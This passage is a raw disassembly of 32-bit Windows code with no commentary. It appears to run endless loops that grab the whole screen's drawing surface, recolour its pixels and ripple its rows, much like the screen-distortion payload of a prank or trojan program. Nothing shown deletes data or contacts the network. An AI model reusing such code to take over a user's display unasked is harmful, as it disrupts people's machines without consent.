  401ebc:	89 c8                	mov    %ecx,%eax
  401ebe:	c1 f8 1f             	sar    $0x1f,%eax
  401ec1:	29 c2                	sub    %eax,%edx
  401ec3:	89 d0                	mov    %edx,%eax
  401ec5:	6b c0 1e             	imul   $0x1e,%eax,%eax
  401ec8:	29 c1                	sub    %eax,%ecx
  401eca:	89 c8                	mov    %ecx,%eax
  401ecc:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  401ed2:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  401ed8:	d9 05 58 81 40 00    	flds   0x408158
  401ede:	de f9                	fdivrp %st,%st(1)
  401ee0:	de c1                	faddp  %st,%st(1)
  401ee2:	d9 e8                	fld1
  401ee4:	dd 5c 24 08          	fstpl  0x8(%esp)
  401ee8:	dd 1c 24             	fstpl  (%esp)
  401eeb:	e8 20 4e 00 00       	call   0x406d10
  401ef0:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  401ef6:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  401efc:	d9 5d 80             	fstps  -0x80(%ebp)
  401eff:	d9 45 84             	flds   -0x7c(%ebp)
  401f02:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401f05:	ba 67 66 66 66       	mov    $0x66666667,%edx
  401f0a:	89 c8                	mov    %ecx,%eax
  401f0c:	f7 ea                	imul   %edx
  401f0e:	c1 fa 03             	sar    $0x3,%edx
  401f11:	89 c8                	mov    %ecx,%eax
  401f13:	c1 f8 1f             	sar    $0x1f,%eax
  401f16:	29 c2                	sub    %eax,%edx
  401f18:	89 d0                	mov    %edx,%eax
  401f1a:	c1 e0 02             	shl    $0x2,%eax
  401f1d:	01 d0                	add    %edx,%eax
  401f1f:	c1 e0 02             	shl    $0x2,%eax
  401f22:	29 c1                	sub    %eax,%ecx
  401f24:	89 ca                	mov    %ecx,%edx
  401f26:	89 95 60 ff ff ff    	mov    %edx,-0xa0(%ebp)
  401f2c:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  401f32:	d9 05 5c 81 40 00    	flds   0x40815c
  401f38:	de f9                	fdivrp %st,%st(1)
  401f3a:	de c1                	faddp  %st,%st(1)
  401f3c:	d9 e8                	fld1
  401f3e:	dd 5c 24 08          	fstpl  0x8(%esp)
  401f42:	dd 1c 24             	fstpl  (%esp)
  401f45:	e8 c6 4d 00 00       	call   0x406d10
  401f4a:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  401f50:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  401f56:	d9 5d 84             	fstps  -0x7c(%ebp)
  401f59:	8b 45 88             	mov    -0x78(%ebp),%eax
  401f5c:	8b 55 bc             	mov    -0x44(%ebp),%edx
  401f5f:	c1 e2 02             	shl    $0x2,%edx
  401f62:	8d 1c 10             	lea    (%eax,%edx,1),%ebx
  401f65:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  401f6b:	89 04 24             	mov    %eax,(%esp)
  401f6e:	8b 45 80             	mov    -0x80(%ebp),%eax
  401f71:	89 44 24 04          	mov    %eax,0x4(%esp)
  401f75:	8b 45 84             	mov    -0x7c(%ebp),%eax
  401f78:	89 44 24 08          	mov    %eax,0x8(%esp)
  401f7c:	e8 32 fa ff ff       	call   0x4019b3
  401f81:	89 03                	mov    %eax,(%ebx)
  401f83:	83 45 dc 01          	addl   $0x1,-0x24(%ebp)
  401f87:	e9 06 fe ff ff       	jmp    0x401d92
  401f8c:	83 45 e0 01          	addl   $0x1,-0x20(%ebp)
  401f90:	e9 ea fd ff ff       	jmp    0x401d7f
  401f95:	83 45 e4 01          	addl   $0x1,-0x1c(%ebp)
  401f99:	c7 44 24 28 20 00 cc 	movl   $0xcc0020,0x28(%esp)
  401fa0:	00 
  401fa1:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401fa4:	89 44 24 24          	mov    %eax,0x24(%esp)
  401fa8:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401fab:	89 44 24 20          	mov    %eax,0x20(%esp)
  401faf:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  401fb6:	00 
  401fb7:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  401fbe:	00 
  401fbf:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401fc2:	89 44 24 14          	mov    %eax,0x14(%esp)
  401fc6:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401fc9:	89 44 24 10          	mov    %eax,0x10(%esp)
  401fcd:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401fd0:	89 44 24 0c          	mov    %eax,0xc(%esp)
  401fd4:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401fdb:	00 
  401fdc:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401fe3:	00 
  401fe4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401fe7:	89 04 24             	mov    %eax,(%esp)
  401fea:	a1 04 a2 40 00       	mov    0x40a204,%eax
  401fef:	ff d0                	call   *%eax
  401ff1:	83 ec 2c             	sub    $0x2c,%esp
  401ff4:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401ff7:	89 44 24 04          	mov    %eax,0x4(%esp)
  401ffb:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402002:	a1 04 a3 40 00       	mov    0x40a304,%eax
  402007:	ff d0                	call   *%eax
  402009:	83 ec 08             	sub    $0x8,%esp
  40200c:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40200f:	89 04 24             	mov    %eax,(%esp)
  402012:	a1 ec a1 40 00       	mov    0x40a1ec,%eax
  402017:	ff d0                	call   *%eax
  402019:	83 ec 04             	sub    $0x4,%esp
  40201c:	e9 e8 fc ff ff       	jmp    0x401d09
  402021:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402025:	83 e4 f0             	and    $0xfffffff0,%esp
  402028:	ff 71 fc             	push   -0x4(%ecx)
  40202b:	55                   	push   %ebp
  40202c:	89 e5                	mov    %esp,%ebp
  40202e:	57                   	push   %edi
  40202f:	53                   	push   %ebx
  402030:	51                   	push   %ecx
  402031:	81 ec dc 00 00 00    	sub    $0xdc,%esp
  402037:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40203e:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  402043:	ff d0                	call   *%eax
  402045:	83 ec 04             	sub    $0x4,%esp
  402048:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40204b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40204e:	89 04 24             	mov    %eax,(%esp)
  402051:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  402056:	ff d0                	call   *%eax
  402058:	83 ec 04             	sub    $0x4,%esp
  40205b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40205e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402065:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  40206a:	ff d0                	call   *%eax
  40206c:	83 ec 04             	sub    $0x4,%esp
  40206f:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402072:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  402079:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  40207e:	ff d0                	call   *%eax
  402080:	83 ec 04             	sub    $0x4,%esp
  402083:	89 45 cc             	mov    %eax,-0x34(%ebp)
  402086:	8d 55 8c             	lea    -0x74(%ebp),%edx
  402089:	b8 00 00 00 00       	mov    $0x0,%eax
  40208e:	b9 0b 00 00 00       	mov    $0xb,%ecx
  402093:	89 d7                	mov    %edx,%edi
  402095:	f3 ab                	rep stos %eax,%es:(%edi)
  402097:	c7 45 8c 2c 00 00 00 	movl   $0x2c,-0x74(%ebp)
  40209e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4020a1:	89 45 90             	mov    %eax,-0x70(%ebp)
  4020a4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4020a7:	89 45 94             	mov    %eax,-0x6c(%ebp)
  4020aa:	66 c7 45 98 01 00    	movw   $0x1,-0x68(%ebp)
  4020b0:	66 c7 45 9a 20 00    	movw   $0x20,-0x66(%ebp)
  4020b6:	c7 45 9c 00 00 00 00 	movl   $0x0,-0x64(%ebp)
  4020bd:	c7 45 88 00 00 00 00 	movl   $0x0,-0x78(%ebp)
  4020c4:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4020cb:	00 
  4020cc:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  4020d3:	00 
  4020d4:	8d 45 88             	lea    -0x78(%ebp),%eax
  4020d7:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4020db:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4020e2:	00 
  4020e3:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4020e6:	89 44 24 04          	mov    %eax,0x4(%esp)
  4020ea:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4020ed:	89 04 24             	mov    %eax,(%esp)
  4020f0:	a1 e4 a1 40 00       	mov    0x40a1e4,%eax
  4020f5:	ff d0                	call   *%eax
  4020f7:	83 ec 18             	sub    $0x18,%esp
  4020fa:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4020fd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402100:	89 44 24 04          	mov    %eax,0x4(%esp)
  402104:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402107:	89 04 24             	mov    %eax,(%esp)
  40210a:	a1 fc a1 40 00       	mov    0x40a1fc,%eax
  40210f:	ff d0                	call   *%eax
  402111:	83 ec 08             	sub    $0x8,%esp
  402114:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40211b:	d9 05 50 81 40 00    	flds   0x408150
  402121:	d9 5d c4             	fstps  -0x3c(%ebp)
  402124:	d9 05 54 81 40 00    	flds   0x408154
  40212a:	d9 5d c0             	fstps  -0x40(%ebp)
  40212d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402134:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  402139:	ff d0                	call   *%eax
  40213b:	83 ec 04             	sub    $0x4,%esp
  40213e:	89 45 d8             	mov    %eax,-0x28(%ebp)
  402141:	c7 44 24 28 20 00 cc 	movl   $0xcc0020,0x28(%esp)
  402148:	00 
  402149:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40214c:	89 44 24 24          	mov    %eax,0x24(%esp)
  402150:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402153:	89 44 24 20          	mov    %eax,0x20(%esp)
  402157:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  40215e:	00 
  40215f:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  402166:	00 
  402167:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40216a:	89 44 24 14          	mov    %eax,0x14(%esp)
  40216e:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402171:	89 44 24 10          	mov    %eax,0x10(%esp)
  402175:	8b 45 d0             	mov    -0x30(%ebp),%eax
  402178:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40217c:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  402183:	00 
  402184:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40218b:	00 
  40218c:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40218f:	89 04 24             	mov    %eax,(%esp)
  402192:	a1 04 a2 40 00       	mov    0x40a204,%eax
  402197:	ff d0                	call   *%eax
  402199:	83 ec 2c             	sub    $0x2c,%esp
  40219c:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  4021a3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4021a6:	3b 45 d0             	cmp    -0x30(%ebp),%eax
  4021a9:	0f 8d f7 01 00 00    	jge    0x4023a6
  4021af:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4021b6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4021b9:	3b 45 cc             	cmp    -0x34(%ebp),%eax
  4021bc:	0f 8d db 01 00 00    	jge    0x40239d
  4021c2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4021c5:	0f af 45 d0          	imul   -0x30(%ebp),%eax
  4021c9:	89 c2                	mov    %eax,%edx
  4021cb:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4021ce:	01 d0                	add    %edx,%eax
  4021d0:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4021d3:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4021d6:	83 f0 04             	xor    $0x4,%eax
  4021d9:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  4021df:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  4021e5:	dd 9d 60 ff ff ff    	fstpl  -0xa0(%ebp)
  4021eb:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4021ee:	c1 e0 02             	shl    $0x2,%eax
  4021f1:	89 85 58 ff ff ff    	mov    %eax,-0xa8(%ebp)
  4021f7:	db 85 58 ff ff ff    	fildl  -0xa8(%ebp)
  4021fd:	dd 9d 58 ff ff ff    	fstpl  -0xa8(%ebp)
  402203:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402206:	0b 45 dc             	or     -0x24(%ebp),%eax
  402209:	89 85 54 ff ff ff    	mov    %eax,-0xac(%ebp)
  40220f:	db 85 54 ff ff ff    	fildl  -0xac(%ebp)
  402215:	dd 1c 24             	fstpl  (%esp)
  402218:	e8 e3 49 00 00       	call   0x406c00
  40221d:	dc 8d 58 ff ff ff    	fmull  -0xa8(%ebp)
  402223:	dc 85 60 ff ff ff    	faddl  -0xa0(%ebp)
  402229:	dd 9d 60 ff ff ff    	fstpl  -0xa0(%ebp)
  40222f:	f2 0f 2c 85 60 ff ff 	cvttsd2si -0xa0(%ebp),%eax
  402236:	ff 
  402237:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40223a:	8b 45 88             	mov    -0x78(%ebp),%eax
  40223d:	8b 55 bc             	mov    -0x44(%ebp),%edx
  402240:	c1 e2 02             	shl    $0x2,%edx
  402243:	01 d0                	add    %edx,%eax
  402245:	8b 00                	mov    (%eax),%eax
  402247:	89 85 78 ff ff ff    	mov    %eax,-0x88(%ebp)
  40224d:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  402253:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  402259:	89 54 24 04          	mov    %edx,0x4(%esp)
  40225d:	89 04 24             	mov    %eax,(%esp)
  402260:	e8 eb f4 ff ff       	call   0x401750
  402265:	8b 85 68 ff ff ff    	mov    -0x98(%ebp),%eax
  40226b:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  402271:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  402277:	89 45 80             	mov    %eax,-0x80(%ebp)
  40227a:	8b 85 70 ff ff ff    	mov    -0x90(%ebp),%eax
  402280:	89 45 84             	mov    %eax,-0x7c(%ebp)
  402283:	db 45 b8             	fildl  -0x48(%ebp)
  402286:	d8 75 c4             	fdivs  -0x3c(%ebp)
  402289:	db 45 dc             	fildl  -0x24(%ebp)
  40228c:	db 45 cc             	fildl  -0x34(%ebp)
  40228f:	de f9                	fdivrp %st,%st(1)
  402291:	d8 4d c0             	fmuls  -0x40(%ebp)
  402294:	de c1                	faddp  %st,%st(1)
  402296:	d9 e8                	fld1
  402298:	dd 5c 24 08          	fstpl  0x8(%esp)
  40229c:	dd 1c 24             	fstpl  (%esp)
  40229f:	e8 6c 4a 00 00       	call   0x406d10
  4022a4:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  4022aa:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  4022b0:	d9 9d 7c ff ff ff    	fstps  -0x84(%ebp)
  4022b6:	d9 45 80             	flds   -0x80(%ebp)
  4022b9:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4022bc:	ba 89 88 88 88       	mov    $0x88888889,%edx
  4022c1:	89 c8                	mov    %ecx,%eax
  4022c3:	f7 ea                	imul   %edx
  4022c5:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  4022c8:	c1 f8 04             	sar    $0x4,%eax
  4022cb:	89 c2                	mov    %eax,%edx
  4022cd:	89 c8                	mov    %ecx,%eax
  4022cf:	c1 f8 1f             	sar    $0x1f,%eax
  4022d2:	29 c2                	sub    %eax,%edx
  4022d4:	89 d0                	mov    %edx,%eax
  4022d6:	6b c0 1e             	imul   $0x1e,%eax,%eax
  4022d9:	29 c1                	sub    %eax,%ecx
  4022db:	89 c8                	mov    %ecx,%eax
  4022dd:	89 85 60 ff ff ff    	mov    %eax,-0xa0(%ebp)
  4022e3:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  4022e9:	d9 05 58 81 40 00    	flds   0x408158
  4022ef:	de f9                	fdivrp %st,%st(1)
  4022f1:	de c1                	faddp  %st,%st(1)
  4022f3:	d9 e8                	fld1
  4022f5:	dd 5c 24 08          	fstpl  0x8(%esp)
  4022f9:	dd 1c 24             	fstpl  (%esp)
  4022fc:	e8 0f 4a 00 00       	call   0x406d10
  402301:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  402307:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  40230d:	d9 5d 80             	fstps  -0x80(%ebp)
  402310:	d9 45 84             	flds   -0x7c(%ebp)
  402313:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402316:	ba 67 66 66 66       	mov    $0x66666667,%edx
  40231b:	89 c8                	mov    %ecx,%eax
  40231d:	f7 ea                	imul   %edx
  40231f:	c1 fa 03             	sar    $0x3,%edx
  402322:	89 c8                	mov    %ecx,%eax
  402324:	c1 f8 1f             	sar    $0x1f,%eax
  402327:	29 c2                	sub    %eax,%edx
  402329:	89 d0                	mov    %edx,%eax
  40232b:	c1 e0 02             	shl    $0x2,%eax
  40232e:	01 d0                	add    %edx,%eax
  402330:	c1 e0 02             	shl    $0x2,%eax
  402333:	29 c1                	sub    %eax,%ecx
  402335:	89 ca                	mov    %ecx,%edx
  402337:	89 95 60 ff ff ff    	mov    %edx,-0xa0(%ebp)
  40233d:	db 85 60 ff ff ff    	fildl  -0xa0(%ebp)
  402343:	d9 05 5c 81 40 00    	flds   0x40815c
  402349:	de f9                	fdivrp %st,%st(1)
  40234b:	de c1                	faddp  %st,%st(1)
  40234d:	d9 e8                	fld1
  40234f:	dd 5c 24 08          	fstpl  0x8(%esp)
  402353:	dd 1c 24             	fstpl  (%esp)
  402356:	e8 b5 49 00 00       	call   0x406d10
  40235b:	d9 9d 60 ff ff ff    	fstps  -0xa0(%ebp)
  402361:	d9 85 60 ff ff ff    	flds   -0xa0(%ebp)
  402367:	d9 5d 84             	fstps  -0x7c(%ebp)
  40236a:	8b 45 88             	mov    -0x78(%ebp),%eax
  40236d:	8b 55 bc             	mov    -0x44(%ebp),%edx
  402370:	c1 e2 02             	shl    $0x2,%edx
  402373:	8d 1c 10             	lea    (%eax,%edx,1),%ebx
  402376:	8b 85 7c ff ff ff    	mov    -0x84(%ebp),%eax
  40237c:	89 04 24             	mov    %eax,(%esp)
  40237f:	8b 45 80             	mov    -0x80(%ebp),%eax
  402382:	89 44 24 04          	mov    %eax,0x4(%esp)
  402386:	8b 45 84             	mov    -0x7c(%ebp),%eax
  402389:	89 44 24 08          	mov    %eax,0x8(%esp)
  40238d:	e8 21 f6 ff ff       	call   0x4019b3
  402392:	89 03                	mov    %eax,(%ebx)
  402394:	83 45 dc 01          	addl   $0x1,-0x24(%ebp)
  402398:	e9 19 fe ff ff       	jmp    0x4021b6
  40239d:	83 45 e0 01          	addl   $0x1,-0x20(%ebp)
  4023a1:	e9 fd fd ff ff       	jmp    0x4021a3
  4023a6:	83 45 e4 01          	addl   $0x1,-0x1c(%ebp)
  4023aa:	c7 44 24 28 20 00 cc 	movl   $0xcc0020,0x28(%esp)
  4023b1:	00 
  4023b2:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4023b5:	89 44 24 24          	mov    %eax,0x24(%esp)
  4023b9:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4023bc:	89 44 24 20          	mov    %eax,0x20(%esp)
  4023c0:	c7 44 24 1c 00 00 00 	movl   $0x0,0x1c(%esp)
  4023c7:	00 
  4023c8:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4023cf:	00 
  4023d0:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4023d3:	89 44 24 14          	mov    %eax,0x14(%esp)
  4023d7:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4023da:	89 44 24 10          	mov    %eax,0x10(%esp)
  4023de:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4023e1:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4023e5:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4023ec:	00 
  4023ed:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  4023f4:	00 
  4023f5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4023f8:	89 04 24             	mov    %eax,(%esp)
  4023fb:	a1 04 a2 40 00       	mov    0x40a204,%eax
  402400:	ff d0                	call   *%eax
  402402:	83 ec 2c             	sub    $0x2c,%esp
  402405:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402408:	89 44 24 04          	mov    %eax,0x4(%esp)
  40240c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402413:	a1 04 a3 40 00       	mov    0x40a304,%eax
  402418:	ff d0                	call   *%eax
  40241a:	83 ec 08             	sub    $0x8,%esp
  40241d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402420:	89 04 24             	mov    %eax,(%esp)
  402423:	a1 ec a1 40 00       	mov    0x40a1ec,%eax
  402428:	ff d0                	call   *%eax
  40242a:	83 ec 04             	sub    $0x4,%esp
  40242d:	e9 fb fc ff ff       	jmp    0x40212d
  402432:	55                   	push   %ebp
  402433:	89 e5                	mov    %esp,%ebp
  402435:	83 ec 68             	sub    $0x68,%esp
  402438:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40243f:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  402444:	ff d0                	call   *%eax
  402446:	83 ec 04             	sub    $0x4,%esp
  402449:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40244c:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  402453:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  402458:	ff d0                	call   *%eax
  40245a:	83 ec 04             	sub    $0x4,%esp
  40245d:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402460:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  402463:	ba 67 66 66 66       	mov    $0x66666667,%edx
  402468:	89 c8                	mov    %ecx,%eax
  40246a:	f7 ea                	imul   %edx
  40246c:	d1 fa                	sar    $1,%edx
  40246e:	89 c8                	mov    %ecx,%eax
  402470:	c1 f8 1f             	sar    $0x1f,%eax
  402473:	29 c2                	sub    %eax,%edx
  402475:	89 d0                	mov    %edx,%eax
  402477:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40247a:	c7 45 e4 04 00 00 00 	movl   $0x4,-0x1c(%ebp)
  402481:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402488:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  40248d:	ff d0                	call   *%eax
  40248f:	83 ec 04             	sub    $0x4,%esp
  402492:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402495:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40249c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40249f:	01 c0                	add    %eax,%eax
  4024a1:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  4024a4:	7d 7c                	jge    0x402522
  4024a6:	db 45 f4             	fildl  -0xc(%ebp)
  4024a9:	db 45 e8             	fildl  -0x18(%ebp)
  4024ac:	de f9                	fdivrp %st,%st(1)
  4024ae:	dd 05 60 81 40 00    	fldl   0x408160
  4024b4:	de c9                	fmulp  %st,%st(1)
  4024b6:	dd 1c 24             	fstpl  (%esp)
  4024b9:	e8 72 48 00 00       	call   0x406d30
  4024be:	db 45 e4             	fildl  -0x1c(%ebp)
  4024c1:	de c9                	fmulp  %st,%st(1)
  4024c3:	dd 5d d0             	fstpl  -0x30(%ebp)
  4024c6:	f2 0f 2c 45 d0       	cvttsd2si -0x30(%ebp),%eax
  4024cb:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4024ce:	c7 44 24 20 20 00 cc 	movl   $0xcc0020,0x20(%esp)
  4024d5:	00 
  4024d6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024d9:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4024dd:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4024e0:	89 44 24 18          	mov    %eax,0x18(%esp)
  4024e4:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4024e7:	89 44 24 14          	mov    %eax,0x14(%esp)
  4024eb:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  4024f2:	00 
  4024f3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4024f6:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4024fa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4024fd:	89 44 24 08          	mov    %eax,0x8(%esp)
  402501:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  402508:	00 
  402509:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40250c:	89 04 24             	mov    %eax,(%esp)
  40250f:	a1 d8 a1 40 00       	mov    0x40a1d8,%eax
  402514:	ff d0                	call   *%eax
  402516:	83 ec 24             	sub    $0x24,%esp
  402519:	83 45 f4 01          	addl   $0x1,-0xc(%ebp)
  40251d:	e9 7a ff ff ff       	jmp    0x40249c
  402522:	e8 11 49 00 00       	call   0x406e38
  402527:	89 c1                	mov    %eax,%ecx
  402529:	ba 1f 85 eb 51       	mov    $0x51eb851f,%edx
  40252e:	89 c8                	mov    %ecx,%eax
  402530:	f7 ea                	imul   %edx
  402532:	c1 fa 05             	sar    $0x5,%edx
  402535:	89 c8                	mov    %ecx,%eax
  402537:	c1 f8 1f             	sar    $0x1f,%eax
  40253a:	29 c2                	sub    %eax,%edx
  40253c:	89 d0                	mov    %edx,%eax
  40253e:	6b c0 64             	imul   $0x64,%eax,%eax
  402541:	29 c1                	sub    %eax,%ecx
  402543:	89 c8                	mov    %ecx,%eax
  402545:	8d 48 01             	lea    0x1(%eax),%ecx
  402548:	ba 6b 4c a4 07       	mov    $0x7a44c6b,%edx
  40254d:	89 c8                	mov    %ecx,%eax
  40254f:	f7 ea                	imul   %edx
  402551:	d1 fa                	sar    $1,%edx
  402553:	89 c8                	mov    %ecx,%eax
  402555:	c1 f8 1f             	sar    $0x1f,%eax
  402558:	29 c2                	sub    %eax,%edx
  40255a:	89 d0                	mov    %edx,%eax
  40255c:	6b c0 43             	imul   $0x43,%eax,%eax
  40255f:	29 c1                	sub    %eax,%ecx
  402561:	89 c8                	mov    %ecx,%eax
  402563:	85 c0                	test   %eax,%eax
  402565:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402568:	89 44 24 04          	mov    %eax,0x4(%esp)
  40256c:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  402573:	a1 04 a3 40 00       	mov    0x40a304,%eax
  402578:	ff d0                	call   *%eax
  40257a:	83 ec 08             	sub    $0x8,%esp
  40257d:	e9 ff fe ff ff       	jmp    0x402481
  402582:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  402586:	83 e4 f0             	and    $0xfffffff0,%esp
  402589:	ff 71 fc             	push   -0x4(%ecx)
  40258c:	55                   	push   %ebp
  40258d:	89 e5                	mov    %esp,%ebp
  40258f:	57                   	push   %edi
  402590:	53                   	push   %ebx
  402591:	51                   	push   %ecx
  402592:	81 ec dc 00 00 00    	sub    $0xdc,%esp
  402598:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40259f:	a1 f4 a2 40 00       	mov    0x40a2f4,%eax
  4025a4:	ff d0                	call   *%eax
  4025a6:	83 ec 04             	sub    $0x4,%esp
  4025a9:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4025ac:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4025af:	89 04 24             	mov    %eax,(%esp)
  4025b2:	a1 e0 a1 40 00       	mov    0x40a1e0,%eax
  4025b7:	ff d0                	call   *%eax
  4025b9:	83 ec 04             	sub    $0x4,%esp
  4025bc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4025bf:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  4025c6:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  4025cb:	ff d0                	call   *%eax
  4025cd:	83 ec 04             	sub    $0x4,%esp
  4025d0:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4025d3:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4025da:	a1 f8 a2 40 00       	mov    0x40a2f8,%eax
  4025df:	ff d0                	call   *%eax
  4025e1:	83 ec 04             	sub    $0x4,%esp
  4025e4:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4025e7:	8d 55 8c             	lea    -0x74(%ebp),%edx
  4025ea:	b8 00 00 00 00       	mov    $0x0,%eax
  4025ef:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4025f4:	89 d7                	mov    %edx,%edi
  4025f6:	f3 ab                	rep stos %eax,%es:(%edi)
  4025f8:	c7 45 8c 2c 00 00 00 	movl   $0x2c,-0x74(%ebp)
  4025ff:	8b 45 d0             	mov    -0x30(%ebp),%eax
